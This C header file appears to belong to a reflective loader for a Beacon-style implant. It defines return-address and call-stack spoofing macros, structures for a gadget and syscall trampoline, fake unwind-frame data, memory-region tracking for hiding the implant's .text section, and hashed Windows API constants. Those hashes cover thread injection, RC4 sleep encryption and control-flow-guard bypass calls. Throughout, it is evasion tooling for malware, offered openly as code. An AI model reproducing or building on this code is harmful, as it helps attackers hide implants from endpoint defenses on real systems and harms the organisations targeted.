//
// https://stackoverflow.com/questions/3046889/optional-parameters-with-c-macros
// https://github.com/SecIdiot/TitanLdr/blob/master/Macros.h
//

#pragma once

#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <ntstatus.h>
#include "native.h"

// Spoof stuff
// SPOOF first 3 args are: Function, Module, Size. Only function is necessary, else a rando gadget from kernel32 is pulled
// Then just pass the rest of the arguments are you would normally
#define SPOOF_X( function, module, size )                                            SpoofRetAddr( 0, function, module, size, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_A( function, module, size, a )                                         SpoofRetAddr( 0, function, module, size, a, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_B( function, module, size, a, b )                                      SpoofRetAddr( 0, function, module, size, a, b, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_C( function, module, size, a, b, c )                                   SpoofRetAddr( 0, function, module, size, a, b, c, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_D( function, module, size, a, b, c, d )                                SpoofRetAddr( 0, function, module, size, a, b, c, d, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_E( function, module, size, a, b, c, d, e )                             SpoofRetAddr( 1, function, module, size, a, b, c, d, e, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_F( function, module, size, a, b, c, d, e, f )                          SpoofRetAddr( 2, function, module, size, a, b, c, d, e, f, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_G( function, module, size, a, b, c, d, e, f, g )                       SpoofRetAddr( 3, function, module, size, a, b, c, d, e, f, g, NULL, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_H( function, module, size, a, b, c, d, e, f, g, h )                    SpoofRetAddr( 4, function, module, size, a, b, c, d, e, f, g, h, NULL, NULL, NULL, NULL, NULL )
#define SPOOF_I( function, module, size, a, b, c, d, e, f, g, h, i )                 SpoofRetAddr( 5, function, module, size, a, b, c, d, e, f, g, h, i, NULL, NULL, NULL, NULL )
#define SPOOF_J( function, module, size, a, b, c, d, e, f, g, h, i, j )              SpoofRetAddr( 6, function, module, size, a, b, c, d, e, f, g, h, i, j, NULL, NULL, NULL )
#define SPOOF_K( function, module, size, a, b, c, d, e, f, g, h, i, j, k )           SpoofRetAddr( 7, function, module, size, a, b, c, d, e, f, g, h, i, j, k, NULL, NULL )
#define SPOOF_L( function, module, size, a, b, c, d, e, f, g, h, i, j, k, l )        SpoofRetAddr( 8, function, module, size, a, b, c, d, e, f, g, h, i, j, k, l, NULL )
#define SPOOF_M( function, module, size, a, b, c, d, e, f, g, h, i, j, k, l, m )     SpoofRetAddr( 9, function, module, size, a, b, c, d, e, f, g, h, i, j, k, l, m )
#define SETUP_ARGS(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16, arg17, ...) arg17
#define SPOOF_MACRO_CHOOSER(...) SETUP_ARGS(__VA_ARGS__, SPOOF_M, SPOOF_L, SPOOF_K, SPOOF_J, SPOOF_I, SPOOF_H, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X)
#define SPOOF(...) SPOOF_MACRO_CHOOSER(__VA_ARGS__)(__VA_ARGS__)

#define OFFSET( x )    ( ULONG_PTR )( GetIp( ) - ( ( ULONG_PTR ) & GetIp - ( ULONG_PTR ) x ) )
#define SECTION( x )    __attribute__(( section( ".text$" #x ) ))

#define D_API( x )    __typeof__( x ) * x
#define U_PTR( x )    ( ( ULONG_PTR ) x )
#define C_PTR( x )    ( ( PVOID ) x )
#define G_END( x )    U_PTR( GetIp( ) + 11 )


typedef struct __attribute__(( packed ))
{
    ULONG_PTR Region;           // Base address of Stub + IAT Hooks/Utils + Beacon
    ULONG_PTR Size;             // Size of Stub + IAT Hooks/Utils + Beacon
    HANDLE    Heap;             // Heap Handle
    ULONG_PTR ExecRegion;       // Base address of the original Stub + IAT Hooks/Utils + Beacon
    ULONG_PTR ExecRegionSize;   // Size of Stub + IAT Hooks/Utils + Beacon .text
    ULONG_PTR OriginalText;     // Base address of the original backed up .text
    ULONG_PTR OriginalTextSize; // Size of Original .text section
} STUB, *PSTUB ;

typedef struct
{
    PVOID       Fixup;             // 0
    PVOID       OG_retaddr;        // 8
    PVOID       rbx;               // 16
    PVOID       rdi;               // 24
    PVOID       BTIT_ss;           // 32
    PVOID       BTIT_retaddr;      // 40
    PVOID       Gadget_ss;         // 48
    PVOID       RUTS_ss;           // 56
    PVOID       RUTS_retaddr;      // 64
    PVOID       ssn;               // 72  
    PVOID       trampoline;        // 80
    PVOID       rsi;               // 88
    PVOID       r12;               // 96
    PVOID       r13;               // 104
    PVOID       r14;               // 112
    PVOID       r15;               // 120
} PRM, * PPRM;
/* God Bless Vulcan Raven*/
typedef struct
{
    LPCWSTR dllPath;
    ULONG offset;
    ULONG totalStackSize;
    BOOL requiresLoadLibrary;
    BOOL setsFramePointer;
    PVOID returnAddress;
    BOOL pushRbp;
    ULONG countOfCodes;
    BOOL pushRbpIndex;
} StackFrame, * PStackFrame;

typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, /* info == register number */
    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
} UNWIND_CODE_OPS;

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE, * PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, * PUNWIND_INFO;


extern ULONG_PTR Start( VOID );
extern ULONG_PTR GetIp( VOID );
extern ULONG_PTR Stub( VOID );
extern PVOID     Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, QWORD, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID );
extern PVOID     Fixup( VOID );
extern PVOID     GetRet( VOID );
// These don't matter
extern PVOID     nRtlZeroMemory( VOID );
extern PVOID     nRtlCopyMemory( VOID );


#include "util.h"
#include "retaddr.h"
#include "hooks/hooks.h"

// Modules
#define H_LIB_NTDLL                                 0x1edab0ed
#define H_LIB_ADVAPI32                              0x64bb3129
#define H_LIB_KERNEL32                              0x6ddb9555
#define H_LIB_KERNELBASE                            0x03ebb38b
#define H_LIB_WININET                               0x5cdbcb2d

// ntdll.dll
#define H_API_LDRGETPROCEDUREADDRESS                0xfce76bb6
#define H_API_LDRLOADDLL                            0x9e456a43
#define H_API_LDRUNLOADDLL                          0xd995c1e6
#define H_API_NTALERTRESUMETHREAD                   0x5ba11e28
#define H_API_NTALLOCATEVIRTUALMEMORY               0xf783b8ec
#define H_API_NTCLOSE                               0x40d6e69d
#define H_API_NTCONTINUE                            0xfc3a6c2c
#define H_API_NTCREATEEVENT                         0x28d3233d
#define H_API_NTCREATETHREADEX                      0xaf18cfb0
#define H_API_NTGETCONTEXTTHREAD                    0x6d22f884
#define H_API_NTGETNEXTTHREAD                       0xa410fb9e
#define H_API_NTOPENTHREAD                          0x968e0cb1
#define H_API_NTPROTECTVIRTUALMEMORY                0x50e92888
#define H_API_NTQUERYINFORMATIONPROCESS             0x8cdc5dc2
#define H_API_NTQUERYINFORMATIONTHREAD              0xf5a0461b
#define H_API_NTQUEUEAPCTHREAD                      0x0a6664b8
#define H_API_NTRESUMETHREAD                        0x5a4bc3d0
#define H_API_NTSETCONTEXTTHREAD                    0xffa0bf10
#define H_API_NTSIGNALANDWAITFORSINGLEOBJECT        0x78983aed
#define H_API_NTSUSPENDTHREAD                       0xe43d93e1
#define H_API_NTTERMINATETHREAD                     0xccf58808
#define H_API_NTTESTALERT                           0x858a32df
#define H_API_NTWAITFORSINGLEOBJECT                 0xe8ac0c3c
#define H_API_NTWRITEVIRTUALMEMORY                  0xc3170192
#define H_API_RTLALLOCATEHEAP                       0x3be94c5a
#define H_API_RTLANSISTRINGTOUNICODESTRING          0x6c606cba
#define H_API_RTLCREATEHEAP                         0xe1af6849
#define H_API_RTLCREATEUSERTHREAD                   0x6c827322
#define H_API_RTLEXITUSERTHREAD                     0x2f6db5e8
#define H_API_RTLFREEHEAP                           0x73a9e4d7
#define H_API_RTLFREEUNICODESTRING                  0x61b88f97
#define H_API_RTLINITANSISTRING                     0xa0c8436d
#define H_API_RTLINITUNICODESTRING                  0xef52b589
#define H_API_RTLUSERTHREADSTART                    0x353797c
#define H_API_RTLRANDOMEX                           0x7f1224f5
#define H_API_RTLWALKHEAP                           0x182bae64
#define H_API_RTLCOPYMEMORY                         0xd232bb4b
#define H_API_RTLZEROMEMORY                         0x7906a570

// advapi32.dll
#define H_API_SYSTEMFUNCTION032                     0xe58c8805

// kernel32.dll
#define H_API_GETPROCESSHEAP                        0x36c007a2
#define H_API_HEAPALLOC                             0xadc4062e
#define H_API_SLEEP                                 0xe07cd7e
#define H_API_WAITFORSINGLEOBJECTEX                 0x512e1b97
#define H_API_BASETHREADINITTHUNK                   0xe2491896
#define H_API_SLEEP                                 0xe07cd7e

// kernelbase.dll
#define H_API_SETPROCESSVALIDCALLTARGETS            0x647d9236

// wininet.dll
#define H_API_INTERNETCONNECTA                      0xc058d7b9

// PE Sections
#define H_SECTION_TEXT                              0xb6ea858
#define H_SECTION_PDATA                             0x78fa635d
